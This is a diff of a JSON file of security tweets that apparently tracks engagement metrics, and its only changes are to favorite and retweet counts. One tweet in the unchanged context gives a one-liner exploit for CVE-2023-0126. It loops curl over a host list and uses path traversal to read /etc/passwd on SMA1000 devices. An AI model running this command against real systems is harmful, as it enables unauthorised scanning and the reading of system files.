@@ -51,7 +51,7 @@
     "tweetfavorites": 128,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 33,
+    "tweetretweets": 32,
     "tweettext": "CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000\n\nOne Liner\ncat file.txt| while read host do;do curl -sk \"http://$host:8443/images//////////////////../../../../../../../../etc/passwd\" | grep -i 'root:' &amp;&amp; echo $host \"is VULN\";done\n\n#bugbountytips #bug #CVE https://t.co/shFnrXWTX5",
     "tweettime": "2023-09-28, 05:36:57",
     "tweeturl": "https://twitter.com/thecybertix/status/1707268135907475495",
@@ -78,7 +78,7 @@
     "username": "0vercl0k"
 }
 {
-    "tweetfavorites": 138,
+    "tweetfavorites": 139,
     "tweetquotes": 0,
     "tweetreplies": 1,
     "tweetretweets": 25,
@@ -163,7 +163,7 @@
     "expanded_url": [
         "https://www.zerodayinitiative.com/blog/2023/8/1/exploiting-a-flaw-in-bitmap-handling-in-windows-user-mode-printer-drivers"
     ],
-    "tweetfavorites": 253,
+    "tweetfavorites": 252,
     "tweetquotes": 1,
     "tweetreplies": 1,
     "tweetretweets": 76,
@@ -199,10 +199,10 @@
     "username": "benhawkes"
 }
 {
-    "tweetfavorites": 345,
+    "tweetfavorites": 346,
     "tweetquotes": 3,
     "tweetreplies": 4,
-    "tweetretweets": 59,
+    "tweetretweets": 60,
     "tweettext": "CVE-2023-41892 Craftcms RCE using PHP reflection https://t.co/SHFQ5MGX9B",
     "tweettime": "2023-09-18, 08:19:32",
     "tweeturl": "https://twitter.com/chybeta/status/1703685169637704121",
@@ -238,7 +238,7 @@
     "expanded_url": [
         "https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf"
     ],
-    "tweetfavorites": 697,
+    "tweetfavorites": 696,
     "tweetquotes": 10,
     "tweetreplies": 12,
     "tweetretweets": 176,
@@ -287,7 +287,7 @@
     "expanded_url": [
         "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
     ],
-    "tweetfavorites": 278,
+    "tweetfavorites": 279,
     "tweetquotes": 0,
     "tweetreplies": 0,
     "tweetretweets": 98,
